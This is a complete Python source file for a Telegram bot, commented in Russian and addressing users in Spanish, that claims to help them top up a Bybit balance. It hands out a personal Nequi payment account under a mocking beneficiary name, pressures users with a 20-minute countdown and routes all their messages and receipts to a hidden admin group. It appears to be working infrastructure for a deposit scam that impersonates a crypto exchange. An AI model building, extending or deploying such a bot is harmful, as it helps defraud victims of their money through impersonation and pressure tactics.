import os
import asyncio
import random
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = os.environ.get("TOKEN")
ADMIN_CHAT_ID = -1003725431948

if not TOKEN:
    raise ValueError("Не установлен токен бота")

# --- клавиатуры ---
start_kb = ReplyKeyboardMarkup([["Inicio"]], resize_keyboard=True)
deposit_kb = ReplyKeyboardMarkup([["Ahora", "Más tarde"]], resize_keyboard=True)
get_data_kb = ReplyKeyboardMarkup([["Obtener datos💳"]], resize_keyboard=True)


# --- генерация уникального ID ---
def generate_user_id():
    return "".join(str(random.randint(0, 9)) for _ in range(7)) + "****"


# --- прогресс бар для таймера ---
def build_progress_bar(minutes_left, total=20):
    progress = int((minutes_left / total) * 10)
    green = "🟢" * progress
    white = "⚪" * (10 - progress)
    return green + white


# --- формат времени для таймера ---
def format_time(seconds):
    minutes = seconds // 60
    sec = seconds % 60
    return f"{minutes:02d}:{sec:02d}"


# --- таймер прогресс-бара ---
async def start_payment_timer(message, context):
    total_seconds = 1200  # 20 минут

    while total_seconds > 0:
        minutes_left = total_seconds // 60
        bar = build_progress_bar(minutes_left)
        timer = format_time(total_seconds)

        text = (
            "DATOS ACTUALES:\n"
            "NEQUI ✅\n"
            "Beneficiario: Jose Zalupa\n"
            "Número: 6382929393\n\n"
            "Después de realizar el pago, envíe una captura de pantalla del recibo "
            "al corredor con el que trabaja para confirmar el pago ❗\n\n"
            f"{bar}\n"
            f"Tiempo restante: {timer}"
        )

        try:
            await message.edit_text(text, reply_markup=get_data_kb)
        except:
            break

        await asyncio.sleep(60)
        total_seconds -= 60

    try:
        await message.delete()
    except:
        pass


# --- отправка реквизитов и уведомление админу ---
async def send_payment_info(update: Update, context: ContextTypes.DEFAULT_TYPE):

    # загрузка
    total = 10
    load_msg = await update.message.reply_text("Cargando: " + "░" * total)
    for i in range(1, total + 1):
        await asyncio.sleep(1)
        bar = "█" * i + "░" * (total - i)
        await load_msg.edit_text(f"Cargando: {bar}")
    await load_msg.delete()

    # удалить старое сообщение реквизитов
    if "payment_msg" in context.user_data:
        try:
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=context.user_data["payment_msg"]
            )
        except:
            pass

    # сообщение с реквизитами
    text = (
        "DATOS ACTUALES:\n"
        "NEQUI ✅\n"
        "Beneficiario: Jose Zalupa\n"
        "Número: 6382929393\n\n"
        "Después de realizar el pago, envíe una captura de pantalla del recibo "
        "al corredor con el que trabaja para confirmar el pago ❗"
    )

    msg = await update.message.reply_text(text, reply_markup=get_data_kb)
    context.user_data["payment_msg"] = msg.message_id

    # уведомление админу
    user = update.effective_user
    deposit_id = context.user_data.get("deposit_id", "N/A")
    notify_text = (
        f"💳 Usuario ha recibido los datos\n"
        f"Nombre: {user.first_name}\n"
        f"ID único: {deposit_id}\n"
        f"Telegram ID: {user.id}"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=notify_text)
    except:
        pass

    # запуск таймера
    asyncio.create_task(start_payment_timer(msg, context))


# --- старт ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo_path = os.path.join("images", "card.jpg")
    text = (
        "Hola, este es un bot para recargar el saldo de la plataforma Bybit.\n"
        "Aquí puede obtener los datos necesarios para realizar la recarga.\n\n"
        "Para comenzar, haga clic en el botón «Inicio»"
    )

    if os.path.exists(photo_path):
        with open(photo_path, "rb") as photo:
            await update.message.reply_photo(photo=photo, caption=text, reply_markup=start_kb)
    else:
        await update.message.reply_text(text, reply_markup=start_kb)


# --- пересылка сообщений в админ-группу ---
async def forward_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"👤 {user.first_name} | ID:{user.id}")

    if msg.text:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg.text)
    elif msg.photo:
        await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=msg.photo[-1].file_id, caption=msg.caption)
    elif msg.document:
        await context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=msg.document.file_id, caption=msg.caption)


# --- ответы из админ-группы ---
async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return
    if not update.message.reply_to_message:
        return
    reply_msg = update.message.reply_to_message
    user_id = None
    if reply_msg.text and "ID:" in reply_msg.text:
        try:
            user_id = int(reply_msg.text.split("ID:")[1])
        except:
            pass
    if not user_id:
        return
    await context.bot.send_message(chat_id=user_id, text=update.message.text)


# --- основной обработчик сообщений ---
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    user = update.effective_user

    if msg.chat.id != ADMIN_CHAT_ID:
        await forward_to_admin(update, context)
    if not msg.text:
        return

    text = msg.text.strip()
    state = context.user_data.get("state", "START")

    # --- Inicio ---
    if state == "START" and text == "Inicio":
        if "deposit_id" not in context.user_data:
            context.user_data["deposit_id"] = generate_user_id()
        deposit_id = context.user_data["deposit_id"]
        name = user.first_name
        message = (
            f"{name}\n\n"
            "Se le ha asignado un número único\n"
            f"ID {deposit_id}\n\n"
            "Desea realizar el depósito ahora o más tarde?"
        )
        await msg.reply_text(message, reply_markup=deposit_kb)
        context.user_data["state"] = "ASK_DEPOSIT"

    # --- Ahora ---
    elif state == "ASK_DEPOSIT" and text == "Ahora":
        await send_payment_info(update, context)

    # --- Más tarde ---
    elif state == "ASK_DEPOSIT" and text == "Más tarde":
        await msg.reply_text(
            "Los datos de la plataforma se actualizan constantemente para garantizar la seguridad de los clientes.\n\n"
            "Cuando esté listo para realizar un depósito, haga clic en el botón «Obtener datos💳»",
            reply_markup=get_data_kb
        )
        context.user_data["state"] = "WAIT_DATA"

    # --- Obtener datos ---
    elif text == "Obtener datos💳":
        await send_payment_info(update, context)


# --- запуск бота ---
app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.ALL & ~filters.Chat(ADMIN_CHAT_ID), message_handler))
app.add_handler(MessageHandler(filters.ALL & filters.Chat(ADMIN_CHAT_ID), admin_reply))

print("Бот запущен...")
app.run_polling()